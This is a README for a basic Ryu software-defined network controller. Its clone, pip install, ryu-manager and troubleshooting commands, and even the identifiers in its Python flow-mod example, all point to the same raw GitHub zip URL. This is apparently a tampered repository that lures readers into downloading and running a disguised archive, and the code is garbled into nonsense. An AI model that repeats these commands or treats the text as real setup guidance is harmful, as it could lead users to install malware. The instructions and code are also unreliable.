# sdn_controller
A basic Software-defined network controller

# Simple SDN Controller with Ryu Framework

## Overview
This project provides a simple Software-Defined Networking (SDN) controller built using the Ryu framework. It demonstrates basic SDN functionality, such as processing packets, setting up flow entries, and interacting with OpenFlow switches.

## Features
- Handles basic packet-in events
- Sets up table-miss flow entries for unmatched packets
- Floods packets to all ports as a default forwarding behaviour
- Demonstrates key concepts of SDN using Ryu


## Prerequisites
1. **Python**: Ensure Python 3.9 or later is installed on your system.
2. **Mininet**: Install Mininet for simulating the SDN environment.
3. **Ryu Framework**: The project uses Ryu as the SDN controller framework.
4. **Virtual Environment**: Create and activate a Python virtual environment for dependency management.


## Installation and Setup
### Clone the Repository
```bash
git clone https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
cd sdn_controller/
```

### Set Up Virtual Environment
```bash
python3.9 -m venv venv
source venv/bin/activate
```

### Install Dependencies
```bash
pip install -r https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
```


## Running the Controller
1. Start the Ryu controller:
   ```bash
   ryu-manager https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip
   ```
   The controller will listen for OpenFlow-enabled switches and process events such as `PacketIn`.

2. Launch a Mininet environment (in another terminal window):
   ```bash
   sudo mn --controller=remote,ip=127.0.0.1,port=6633 --topo=single,3
   ```
   Replace `single,3` with your preferred Mininet topology.

3. Test connectivity in Mininet:
   ```bash
   pingall
   ```


## Code Explanation

### Key Components in `https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip`
1. **Switch Features Handler**: Sets up table-miss flow entries for unmatched packets.
2. **Packet-In Handler**: Processes packets sent to the controller by OpenFlow switches and floods them as the default action.

### Example Flow Mod Installation
```python
def _install_table_miss_flow(self, datapath):
    match = https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip()
    actions = [https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip)]
    inst = [https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip, actions)]
    flow_mod = https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(
        datapath=datapath, priority=0, match=match, instructions=inst
    )
    https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip(flow_mod)
```


## Troubleshooting
- **Ryu Import Errors**: Ensure Ryu is installed correctly within your virtual environment using `pip install -r https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip`.
- **Mininet Connection Issues**: Verify that Mininet is configured to use the remote controller and matches the IP and port of your Ryu controller.
- **Ping Failures**: Ensure proper configuration of flow entries in `https://raw.githubusercontent.com/ellah-daniel/sdn_controller/main/sidesplittingly/sdn_controller.zip` or debug using Ryu logs.


## Contributions
Contributions are welcome! Feel free to fork the repository and create pull requests.


## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
